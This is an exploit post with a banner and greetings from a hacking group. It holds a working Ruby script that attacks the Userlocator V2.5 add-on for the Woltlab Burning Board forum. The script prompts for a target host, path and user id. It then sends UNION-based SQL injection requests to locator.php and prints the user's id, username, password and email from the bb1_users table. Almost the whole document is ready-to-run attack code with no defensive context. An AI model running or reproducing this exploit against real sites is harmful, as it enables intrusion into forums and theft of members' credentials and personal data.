----------------------------Information------------------------------------------------
+Name : Woltlab Burning Board Userlocator V2.5 Hack  <=  SQL injection Exploit
+Autor : Easy Laster
+Date   : 08.11.2010
+Script  : Woltlab Burning Board Userlocator V2.5 Hack
+Download : ----
+Price : lizenz
+Language : PHP
+Discovered by Easy Laster
+Security Group 4004-Security-Project
+Greetz to Team-Internet ,Underground Agents and free-hack.com
+And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
Kiba,-tmh-,Dr.ChAoS,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
N00bor,Ic3Drag0n,novaca!ne,n3w7u,Maverick010101,s0red,c1ox,enco,
   
---------------------------------------------------------------------------------------
                                                                                        
 ___ ___ ___ ___                         _ _           _____           _         _
| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|
                                              |___|                 |___|         
   
   
----------------------------------------------------------------------------------------
#!/usr/bin/ruby
#4004-security-project.com
#Discovered and vulnerability by Easy Laster
print "
############################################################
#                    4004-Security-Project                 #
############################################################
#Woltlab Burning Board Userlocator V2.5 Hack SQL Injection #
#                          Exploit                         #
#                     Using Host+Path+id                   #
#                     www.demo.de /wbb/ 1                  #
#                         Easy Laster                      #
############################################################
"
require 'net/http'
block = "#########################################################"
print ""+ block +""
print "\nEnter host name (site.com)->"
host=gets.chomp
print ""+ block +""
print "\nEnter script path (/wbb/)->"
path=gets.chomp
print ""+ block +""
print "\nEnter the id (id)->"
userid=gets.chomp
print ""+ block +""
begin
dir =  "locator.php?sid=&action=get_user&x=%27+union+select+1,conca"+
       "t(0x23,0x23,0x23,0x23,0x23,userid,0x23,0x23,0x23,0x23,0x23),"+
       "3+from+bb1_users+where+userid="+userid+"--+"+"&y=&p="
       http = Net::HTTP.new(host, 80)
       resp= http.get(path+dir)
       print "\nUserid -> "+(/#####(.+)#####/).match(resp.body)[1]
           dir =  "locator.php?sid=&action=get_user&x=%27+union+select+1,conca"+
           "t(0x23,0x23,0x23,0x23,0x23,username,0x23,0x23,0x23,0x23,0x23),"+
           "3+from+bb1_users+where+userid="+userid+"--+"+"&y=&p="
           http = Net::HTTP.new(host, 80)
           resp= http.get(path+dir)
           print "\nUsername -> "+(/#####(.+)#####/).match(resp.body)[1]
                dir =  "locator.php?sid=&action=get_user&x=%27+union+select+1,conca"+
                "t(0x23,0x23,0x23,0x23,0x23,password,0x23,0x23,0x23,0x23,0x23),"+
                "3+from+bb1_users+where+userid="+userid+"--+"+"&y=&p="
                http = Net::HTTP.new(host, 80)
                resp= http.get(path+dir)
                print "\nPassword -> "+(/#####(.+)#####/).match(resp.body)[1]
        dir =  "locator.php?sid=&action=get_user&x=%27+union+select+1,conca"+
        "t(0x23,0x23,0x23,0x23,0x23,email,0x23,0x23,0x23,0x23,0x23),"+
        "3+from+bb1_users+where+userid="+userid+"--+"+"&y=&p="
        http = Net::HTTP.new(host, 80)
        resp= http.get(path+dir)
        print "\nEmail -> "+(/#####(.+)#####/).match(resp.body)[1]
    print "\n#########################################################"
 rescue
print "\nExploit failed"
end